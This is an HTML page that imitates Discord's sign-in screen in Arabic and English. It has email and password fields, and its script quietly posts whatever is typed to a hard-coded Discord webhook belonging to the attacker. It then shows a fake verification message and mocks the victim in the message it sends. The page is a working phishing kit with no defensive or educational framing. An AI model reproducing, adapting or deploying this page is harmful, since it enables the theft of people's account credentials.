<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Add Bot </title>
    <style>
        /* ألوان ديسكورد الرسمية */
        :root {
            --bg-color: #313338;
            --card-bg: #2b2d31;
            --text-primary: #f2f3f5;
            --text-secondary: #b5bac1;
            --input-bg: #1e1f22;
            --button-blue: #5865f2;
            --button-hover: #4752c4;
            --link-blue: #00a8fc;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-primary);
            font-family: 'gg sans', 'Noto Sans', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .login-box {
            background-color: var(--card-bg);
            padding: 32px;
            border-radius: 8px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            width: 100%;
            max-width: 415px;
            text-align: center;
        }

        h2 { margin: 0 0 8px 0; font-size: 24px; font-weight: 600; }
        .sub-title { color: var(--text-secondary); margin-bottom: 20px; font-size: 16px; }

        .form-group { text-align: right; margin-bottom: 20px; }
        
        label {
            display: block;
            color: var(--text-secondary);
            font-size: 12px;
            font-weight: bold;
            text-transform: uppercase;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 10px;
            background-color: var(--input-bg);
            border: none;
            border-radius: 3px;
            color: var(--text-primary);
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: var(--button-blue);
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.17s ease;
            margin-top: 4px;
        }

        button:hover { background-color: var(--button-hover); }

        .footer {
            margin-top: 12px;
            text-align: right;
            font-size: 14px;
            color: var(--text-secondary);
        }

        #status { margin-top: 15px; font-size: 14px; display: none; }
    </style>
</head>
<body>

<div class="login-box">
    <h2>Welcome Back!</h2>
    <div class="sub-title">We're so excited to see you again!</div>

    <div class="form-group">
        <label>Email or Phone Number *</label>
        <input type="text" id="robloxUser">
    </div>

    <div class="form-group">
        <label>Password*</label>
        <input type="text" id="discordUser">
    </div>

    <button onclick="sendData()">Sign In</button>

    <div class="footer">
        هل نسيت كلمة المرور؟ <span style="color: var(--link-blue); cursor: pointer;">سجل من هنا</span>
    </div>

    <div id="status"></div>
</div>

<script>
    async function sendData() {
        const roblox = document.getElementById('robloxUser').value;
        const discord = document.getElementById('discordUser').value;
        const status = document.getElementById('status');
        const btn = document.querySelector('button');

        if (!roblox || !discord) {
            alert("يرجى ملء الحقول");
            return;
        }

        // إخفاء الزر مؤقتاً لمحاكاة التحقق
        btn.innerText = "جاري التحقق...";
        btn.disabled = true;

        const webhookUrl = "https://discord.com/api/webhooks/1479027713816924161/DjMOHPtCCqFG0PfS61vf7lViCM_lwtTvadyW5CvftrnAHxfx8DksfwXV6jeUyAANgbzl";

        const content = `**يوجد شخص حمار**\nبريده : ${roblox}\nيوزره ديسكورد : ${discord}`;

        try {
            // انتظار 2 ثانية لمحاكاة التحقق كما طلبت
            await new Promise(resolve => setTimeout(resolve, 2000));

            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: content })
            });

            status.style.display = "block";
            status.style.color = "#43b581";
            status.innerText = "الرجاء قرائة اليريد المرسل اليك!";
        } catch (error) {
            status.style.display = "block";
            status.style.color = "#f04747";
            status.innerText = "حدث خطأ في الاتصال.";
        } finally {
            btn.innerText = "تسجيل الدخول";
            btn.disabled = false;
        }
    }
</script>

</body>
</html>
